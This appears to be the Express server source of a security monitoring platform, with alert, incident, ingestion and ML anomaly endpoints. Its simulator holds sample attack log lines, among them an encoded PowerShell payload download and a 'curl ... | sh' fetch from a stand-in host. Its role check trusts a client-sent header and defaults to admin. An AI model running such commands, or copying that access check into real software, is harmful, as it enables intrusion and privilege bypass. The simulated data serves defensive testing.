import express from 'express';
import path from 'node:path';
import fs from 'node:fs';
import 'dotenv/config';
import { createServer as createViteServer } from 'vite';
import {
  appendAuditLog,
  computeHealthScore,
  db,
  getAgents,
  getAlerts,
  getArchiveStorageStats,
  getArchives,
  getAuditLogs,
  getFimEvents,
  getIncidents,
  getVulnerabilities,
  ingestTelemetryLine,
  retrainIsolationForestFromStore,
} from './server/db/store.ts';
import { seedInitialDataIfEmpty } from './server/db/seed.ts';
import {
  listRulesetFiles,
  loadAegisConfig,
  readRawConfigFile,
  saveAegisConfigXml,
  saveLocalRulesetFile,
} from './server/engine/config.ts';
import { decodeLog, getLoadedDecoders, reloadDecoders } from './server/engine/decoder.ts';
import { evaluateRules, getLoadedRules, reloadRules } from './server/engine/rules.ts';
import { executeAqlQuery } from './server/engine/aql.ts';
import { extractBehavioralVector, isolationForest } from './server/ml/isolationForest.ts';
import { runEvidenceGroundedInvestigation } from './server/ai/assistant.ts';
import type { RbacRole } from './server/types.ts';

const PORT = 3000;

function getRole(req: express.Request): RbacRole {
  const hdr = String(req.headers['x-aegis-role'] || 'admin').toLowerCase();
  if (hdr === 'analyst' || hdr === 'auditor' || hdr === 'admin') return hdr;
  return 'auditor';
}

function requireRole(allowed: RbacRole[]) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const role = getRole(req);
    if (!allowed.includes(role)) {
      res.status(403).json({
        error: `RBAC Policy Denied: Role '${role}' is not authorized for this action. Required: ${allowed.join(' or ')}.`,
      });
      return;
    }
    next();
  };
}

async function startServer() {
  // Initialize SQLite schema, XML engines, and seed realistic dataset if empty
  reloadDecoders();
  reloadRules();
  seedInitialDataIfEmpty();

  const app = express();
  app.use(express.json({ limit: '5mb' }));
  app.use(express.text({ limit: '5mb', type: 'text/plain' }));

  // Bounded ingestion queue tracker
  let processedSinceBoot = 0;
  let rejectedMaliciousOrMalformed = 0;

  // 1. Health & Gateway Stats
  app.get('/api/v1/health', (_req, res) => {
    const cfg = loadAegisConfig();
    res.json({
      status: 'operational',
      service: 'AegisOne Server',
      domain: cfg.domain,
      organization: cfg.organization,
      ingestionGateway: {
        workerPoolSize: cfg.workerPoolSize,
        boundedQueueMax: cfg.ingestionQueueMax,
        currentQueueDepth: 0,
        processedSinceBoot,
        rejectedPayloads: rejectedMaliciousOrMalformed,
      },
      mlEngine: {
        algorithm: 'IsolationForest',
        numTrees: cfg.mlNumTrees,
        trainedSamples: isolationForest.trainedSamples,
        threshold: cfg.mlAnomalyThreshold,
      },
      archiveStats: getArchiveStorageStats(),
      decodersCount: getLoadedDecoders().length,
      rulesCount: getLoadedRules().length,
    });
  });

  // 2. Command Center Overview
  app.get('/api/v1/overview', (_req, res) => {
    const healthScore = computeHealthScore();
    const alerts = getAlerts(500);
    const incidents = getIncidents();
    const agents = getAgents();
    const fim = getFimEvents();
    const vulns = getVulnerabilities();

    // Severity 0-16 histogram buckets
    const levelBuckets = [
      { label: 'Low (0–4)', min: 0, max: 4, count: 0 },
      { label: 'Medium (5–7)', min: 5, max: 7, count: 0 },
      { label: 'High (8–11)', min: 8, max: 11, count: 0 },
      { label: 'Critical (12–16)', min: 12, max: 16, count: 0 },
    ];
    const ipCounts = new Map<string, number>();
    const userCounts = new Map<string, number>();
    const mitreCounts = new Map<string, { id: string; tactic: string; count: number }>();

    for (const a of alerts) {
      const b = levelBuckets.find((x) => a.rule.level >= x.min && a.rule.level <= x.max);
      if (b) b.count++;

      if (a.data.srcip) {
        const ip = String(a.data.srcip);
        ipCounts.set(ip, (ipCounts.get(ip) || 0) + 1);
      }
      const user = a.data.srcuser || a.data.user;
      if (user) {
        const u = String(user);
        userCounts.set(u, (userCounts.get(u) || 0) + 1);
      }
      if (a.rule.mitre?.id) {
        const key = a.rule.mitre.id;
        const curr = mitreCounts.get(key) || { id: key, tactic: a.rule.mitre.tactic, count: 0 };
        curr.count++;
        mitreCounts.set(key, curr);
      }
    }

    // Build 8-bucket timeline over recent hours
    const now = Date.now();
    const timeline: Array<{ label: string; total: number; highCritical: number; anomalies: number }> = [];
    for (let h = 7; h >= 0; h--) {
      const start = now - (h + 1) * 3600 * 1000;
      const end = now - h * 3600 * 1000;
      const dt = new Date(end);
      const label = `${String(dt.getHours()).padStart(2, '0')}:00`;
      const slice = alerts.filter((a) => {
        const t = Date.parse(a.timestamp);
        return t >= start && t < end;
      });
      timeline.push({
        label,
        total: slice.length,
        highCritical: slice.filter((a) => a.rule.level >= 8).length,
        anomalies: slice.filter((a) => a.ml.isAnomaly).length,
      });
    }

    res.json({
      healthScore,
      counts: {
        totalAlerts: alerts.length,
        openIncidents: incidents.filter((i) => i.status !== 'resolved').length,
        activeAgents: agents.filter((a) => a.status === 'active').length,
        totalAgents: agents.length,
        anomaliesDetected: alerts.filter((a) => a.ml.isAnomaly).length,
        fimEvents: fim.length,
        openVulnerabilities: vulns.filter((v) => v.status === 'open').length,
      },
      severityDistribution: levelBuckets,
      timeline,
      topSourceIps: Array.from(ipCounts.entries())
        .map(([ip, count]) => ({ ip, count }))
        .sort((a, b) => b.count - a.count)
        .slice(0, 6),
      topUsers: Array.from(userCounts.entries())
        .map(([user, count]) => ({ user, count }))
        .sort((a, b) => b.count - a.count)
        .slice(0, 6),
      topMitre: Array.from(mitreCounts.values())
        .sort((a, b) => b.count - a.count)
        .slice(0, 6),
      recentIncidents: incidents.slice(0, 5),
      recentAlerts: alerts.slice(0, 10),
    });
  });

  // 3. Alerts & AQL Explorer
  app.get('/api/v1/alerts', (req, res) => {
    const limit = Math.min(500, Number(req.query.limit || 250));
    const q = String(req.query.q || '');
    const all = getAlerts(500);
    const result = executeAqlQuery(all, q);
    res.json({
      ...result,
      alerts: result.alerts.slice(0, limit),
    });
  });

  app.post('/api/v1/aql/query', (req, res) => {
    const query = String(req.body?.query || '');
    const all = getAlerts(500);
    const result = executeAqlQuery(all, query);
    res.json(result);
  });

  // 4. Incidents Lifecycle
  app.get('/api/v1/incidents', (_req, res) => {
    res.json({ incidents: getIncidents() });
  });

  app.get('/api/v1/incidents/:id', (req, res) => {
    const inc = getIncidents().find((i) => i.id === req.params.id);
    if (!inc) {
      res.status(404).json({ error: 'Incident not found' });
      return;
    }
    const alerts = getAlerts(500).filter((a) => a.incidentId === inc.id);
    res.json({ incident: inc, alerts });
  });

  app.patch('/api/v1/incidents/:id', requireRole(['admin', 'analyst']), (req, res) => {
    const { status, assignedTo } = req.body || {};
    const validStatuses = ['open', 'investigating', 'contained', 'resolved'];
    if (status && !validStatuses.includes(status)) {
      res.status(400).json({ error: `Invalid incident status. Allowed: ${validStatuses.join(', ')}` });
      return;
    }
    const existing = getIncidents().find((i) => i.id === req.params.id);
    if (!existing) {
      res.status(404).json({ error: 'Incident not found' });
      return;
    }
    const nextStatus = status || existing.status;
    const nextAssignee = assignedTo || existing.assignedTo;
    db.prepare('UPDATE incidents SET status = ?, assigned_to = ? WHERE id = ?').run(
      nextStatus,
      nextAssignee,
      req.params.id
    );
    appendAuditLog(
      getRole(req),
      'INCIDENT_UPDATE',
      req.params.id,
      `Status changed from ${existing.status} -> ${nextStatus}; Assignee: ${nextAssignee}`
    );
    res.json({ incident: getIncidents().find((i) => i.id === req.params.id) });
  });

  // 5. Agents, FIM, Vulnerabilities, Archives
  app.get('/api/v1/agents', (_req, res) => {
    res.json({ agents: getAgents() });
  });

  app.get('/api/v1/fim', (_req, res) => {
    res.json({ events: getFimEvents() });
  });

  app.get('/api/v1/vulnerabilities', (_req, res) => {
    res.json({ vulnerabilities: getVulnerabilities() });
  });

  app.patch('/api/v1/vulnerabilities/:id', requireRole(['admin', 'analyst']), (req, res) => {
    const status = req.body?.status === 'patched' ? 'patched' : 'open';
    db.prepare('UPDATE vulnerabilities SET status = ? WHERE id = ?').run(status, req.params.id);
    appendAuditLog(getRole(req), 'VULNERABILITY_STATUS', req.params.id, `Marked ${status}`);
    res.json({ ok: true });
  });

  app.get('/api/v1/archives', (req, res) => {
    const q = String(req.query.q || '').toLowerCase();
    const entries = getArchives(250).filter(
      (e) =>
        !q ||
        e.rawLog.toLowerCase().includes(q) ||
        e.agentName.toLowerCase().includes(q) ||
        e.programName.toLowerCase().includes(q)
    );
    res.json({
      entries,
      storage: getArchiveStorageStats(),
      config: {
        logall: loadAegisConfig().logall,
        logallJson: loadAegisConfig().logallJson,
      },
    });
  });

  // 6. Ingestion Gateway (Live API + File/Batch Upload + Scenario Simulator)
  app.post('/api/v1/ingest', requireRole(['admin', 'analyst']), (req, res) => {
    const body = req.body;
    const lines: string[] = [];
    let agentHint: string | undefined;

    if (typeof body === 'string') {
      lines.push(...body.split(/\r?\n/).filter((l) => l.trim().length > 0));
    } else if (body && Array.isArray(body.logs)) {
      agentHint = body.agentName ? String(body.agentName) : undefined;
      for (const item of body.logs) {
        if (typeof item === 'string' && item.trim()) lines.push(item.trim());
        else if (item && typeof item === 'object') lines.push(JSON.stringify(item));
      }
    } else if (body && typeof body.log === 'string' && body.log.trim()) {
      agentHint = body.agentName ? String(body.agentName) : undefined;
      lines.push(...body.log.split(/\r?\n/).filter((l: string) => l.trim().length > 0));
    } else {
      rejectedMaliciousOrMalformed++;
      res.status(400).json({
        error: 'Malformed telemetry payload. Provide { "log": "..." } or { "logs": [...] } or raw text/plain lines.',
      });
      return;
    }

    const cfg = loadAegisConfig();
    if (lines.length > cfg.ingestionQueueMax) {
      rejectedMaliciousOrMalformed++;
      res.status(429).json({
        error: `Bounded ingestion queue limit exceeded (${lines.length} > ${cfg.ingestionQueueMax}). Split batch and retry.`,
      });
      return;
    }

    const createdAlerts = [];
    let archivedCount = 0;
    for (const line of lines) {
      const result = ingestTelemetryLine(line, agentHint);
      processedSinceBoot++;
      if (result.archived) archivedCount++;
      if (result.alert) createdAlerts.push(result.alert);
    }

    appendAuditLog(
      getRole(req),
      'TELEMETRY_INGEST',
      agentHint || 'gateway',
      `Ingested ${lines.length} lines -> ${createdAlerts.length} alerts, ${archivedCount} archived`
    );

    res.json({
      ingestedLines: lines.length,
      alertsGenerated: createdAlerts.length,
      archivedCount,
      alerts: createdAlerts,
    });
  });

  app.post('/api/v1/ingest/simulate', requireRole(['admin', 'analyst']), (req, res) => {
    const scenario = String(req.body?.scenario || 'ssh_bruteforce');
    const now = new Date().toISOString();
    const scenarios: Record<string, { host: string; lines: string[] }> = {
      ssh_bruteforce: {
        host: 'web-gw-01',
        lines: [
          `${now} web-gw-01 sshd[6101]: Failed password for invalid user admin from 198.51.100.77 port 55102 ssh2`,
          `${now} web-gw-01 sshd[6102]: Failed password for invalid user root from 198.51.100.77 port 55104 ssh2`,
          `${now} web-gw-01 sshd[6103]: Failed password for invalid user test from 198.51.100.77 port 55109 ssh2`,
          `${now} web-gw-01 sshd[6104]: Failed password for invalid user guest from 198.51.100.77 port 55115 ssh2`,
          `${now} web-gw-01 sshd[6105]: Accepted password for svc_backup from 198.51.100.77 port 55120 ssh2`,
        ],
      },
      sysmon_powershell: {
        host: 'win-finance-04',
        lines: [
          JSON.stringify({
            Channel: 'Microsoft-Windows-Sysmon/Operational',
            Computer: 'win-finance-04',
            UtcTime: now,
            EventID: 1,
            User: 'CORP\\r.mehta',
            Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            CommandLine: 'powershell.exe -NoP -NonI -EncodedCommand cwB0AGEAcgB0ACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgAyAC4AOQA5AC8AcABhAHkAbABvAGEAZAAuAGUAeABlAA==',
          }),
          JSON.stringify({
            Channel: 'Microsoft-Windows-Sysmon/Operational',
            Computer: 'win-finance-04',
            UtcTime: now,
            EventID: 3,
            User: 'CORP\\r.mehta',
            SourceIp: '10.10.5.44',
            DestinationIp: '45.141.87.19',
            DestinationPort: 4444,
          }),
        ],
      },
      fim_tamper: {
        host: 'db-postgres-01',
        lines: [
          `${now} db-postgres-01 sudo[9120]: deploy : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c "usermod -aG sudo temp_maint"`,
          `${now} db-postgres-01 aegisone-fim[9125]: action=modified path=/etc/passwd uid=0 sha256_before=a1b2c3d4e5f67890 sha256_after=ff99ee88dd77cc66`,
        ],
      },
      sibling_kv: {
        host: 'web-gw-01',
        lines: [
          `${now} web-gw-01 aegis-session[7201]: srcuser="priyasha.gupta" action="called" dstuser="kushagra.sen" srcip="10.10.1.10"`,
          `${now} web-gw-01 aegis-session[7202]: action="logged on" srcuser="harsh.verma"`,
        ],
      },
      docker_journald: {
        host: 'docker-app-02',
        lines: [
          `${now} docker-app-02 dockerd[3110]: action=exec_start container=auth-proxy image=nginx:alpine user=root`,
          JSON.stringify({
            _HOSTNAME: 'docker-app-02',
            SYSLOG_IDENTIFIER: 'systemd-journald',
            _SYSTEMD_UNIT: 'rogue-updater.service',
            SYSLOG_PID: 8821,
            MESSAGE: 'Started /tmp/dropper.sh via curl http://198.51.100.77/init.sh | sh',
            timestamp: now,
          }),
        ],
      },
    };

    const chosen = scenarios[scenario] || scenarios.ssh_bruteforce;
    const alerts = [];
    for (const line of chosen.lines) {
      const r = ingestTelemetryLine(line, chosen.host, now);
      processedSinceBoot++;
      if (r.alert) alerts.push(r.alert);
    }

    appendAuditLog(
      getRole(req),
      'SCENARIO_SIMULATE',
      scenario,
      `Simulated ${chosen.lines.length} events on ${chosen.host} (${alerts.length} alerts)`
    );

    res.json({
      scenario,
      ingestedLines: chosen.lines.length,
      alertsGenerated: alerts.length,
      alerts,
    });
  });

  // 7. Decoder & Rule Sandbox (Dry-Run)
  app.post('/api/v1/sandbox/test', (req, res) => {
    const rawLog = String(req.body?.rawLog || '').trim();
    if (!rawLog) {
      res.status(400).json({ error: 'Provide a non-empty rawLog string to test.' });
      return;
    }
    const trace = decodeLog(rawLog, 'sandbox-host');
    const rule = evaluateRules(trace, rawLog);
    const vec = extractBehavioralVector({
      timestamp: trace.phase1.timestamp,
      ruleLevel: rule.level,
      fields: trace.phase2.extractedFields,
      rawLog,
      recentAgentEventsCount: 1,
      recentUniqueIpsForAgent: 1,
      recentFailedAuthRatio: rule.level >= 5 ? 0.5 : 0.05,
      knownInternalIps: new Set(['10.10.1.10', '10.10.2.15']),
    });
    const ml = isolationForest.score(vec);

    res.json({ trace, rule, ml });
  });

  // 8. Rulesets & Config Management
  app.get('/api/v1/rulesets', (_req, res) => {
    res.json({
      files: listRulesetFiles(),
      decodersCount: getLoadedDecoders().length,
      rulesCount: getLoadedRules().length,
    });
  });

  app.put('/api/v1/rulesets/:id', requireRole(['admin']), (req, res) => {
    try {
      const content = String(req.body?.content || '');
      saveLocalRulesetFile(req.params.id, content);
      const decoders = reloadDecoders();
      const rules = reloadRules();
      appendAuditLog(getRole(req), 'RULESET_UPDATE', req.params.id, 'Saved XML ruleset and hot-reloaded engine');
      res.json({ ok: true, decodersCount: decoders.length, rulesCount: rules.length });
    } catch (err) {
      res.status(400).json({ error: err instanceof Error ? err.message : 'Invalid XML' });
    }
  });

  app.get('/api/v1/config', (_req, res) => {
    res.json({
      config: loadAegisConfig(),
      rawXml: readRawConfigFile(),
    });
  });

  app.put('/api/v1/config', requireRole(['admin']), (req, res) => {
    try {
      const xml = String(req.body?.rawXml || '');
      const updated = saveAegisConfigXml(xml);
      appendAuditLog(
        getRole(req),
        'CONFIG_UPDATE',
        'etc/aegisone.conf',
        `logall=${updated.logall}, logall_json=${updated.logallJson}, ml_threshold=${updated.mlAnomalyThreshold}`
      );
      res.json({ config: updated, rawXml: readRawConfigFile() });
    } catch (err) {
      res.status(400).json({ error: err instanceof Error ? err.message : 'Failed to save configuration' });
    }
  });

  // 9. Behavioral ML (Isolation Forest)
  app.get('/api/v1/ml/stats', (_req, res) => {
    const alerts = getAlerts(200);
    const cfg = loadAegisConfig();
    const anomalies = alerts.filter((a) => a.ml.isAnomaly);

    // Aggregate average feature values for anomalies vs nominal
    const featureKeys = [
      'Off-Hours Deviation',
      'Burst Velocity',
      'Source IP Entropy',
      'Failed Auth Ratio',
      'Privileged Exec',
      'External IP Novelty',
      'Payload Risk',
    ];
    const nominalRows = alerts.filter((a) => !a.ml.isAnomaly);
    const avgVec = (list: typeof alerts) =>
      featureKeys.map((label, idx) => {
        const sum = list.reduce((acc, item) => acc + (item.ml.featureVector[idx] || 0), 0);
        return {
          label,
          value: list.length > 0 ? Number((sum / list.length).toFixed(3)) : 0,
        };
      });

    res.json({
      algorithm: 'Isolation Forest (Liu, Ting & Zhou)',
      numTrees: cfg.mlNumTrees,
      subsampleSize: cfg.mlSubsampleSize,
      threshold: cfg.mlAnomalyThreshold,
      trainedSamples: isolationForest.trainedSamples,
      totalEvaluated: alerts.length,
      anomaliesCount: anomalies.length,
      scatterPoints: alerts.slice(0, 80).map((a) => ({
        id: a.id,
        ruleLevel: a.rule.level,
        mlScore: a.ml.score,
        isAnomaly: a.ml.isAnomaly,
        agent: a.agent.name,
        description: a.rule.description,
        topDriver: a.ml.contributions[0]?.label || 'Nominal',
      })),
      featureComparison: {
        nominal: avgVec(nominalRows),
        anomalies: avgVec(anomalies),
      },
      topAnomalies: anomalies.sort((a, b) => b.ml.score - a.ml.score).slice(0, 12),
    });
  });

  app.post('/api/v1/ml/retrain', requireRole(['admin', 'analyst']), (req, res) => {
    const result = retrainIsolationForestFromStore();
    appendAuditLog(
      getRole(req),
      'ML_RETRAIN',
      'IsolationForest',
      `Retrained 64 isolation trees on ${result.trainedSamples} telemetry behavioral vectors`
    );
    res.json({ ok: true, ...result });
  });

  // 10. Audit Logs
  app.get('/api/v1/audit', (_req, res) => {
    res.json({ logs: getAuditLogs() });
  });

  // 11. Evidence-Grounded AI Assistant
  app.post('/api/v1/ai/investigate', async (req, res) => {
    try {
      const question = String(req.body?.question || '').trim();
      if (!question) {
        res.status(400).json({ error: 'Question cannot be empty.' });
        return;
      }
      const result = await runEvidenceGroundedInvestigation({
        question,
        incidentId: req.body?.incidentId || null,
        history: Array.isArray(req.body?.history) ? req.body.history : [],
      });
      res.json(result);
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'AI investigation failed';
      res.status(500).json({ error: msg });
    }
  });

  // Vite dev middleware or static dist serving
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distDir = path.join(process.cwd(), 'dist');
    if (fs.existsSync(distDir)) {
      app.use(express.static(distDir));
      app.get('*', (_req, res) => {
        res.sendFile(path.join(distDir, 'index.html'));
      });
    }
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`AegisOne Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start AegisOne Server:', err);
  process.exit(1);
});
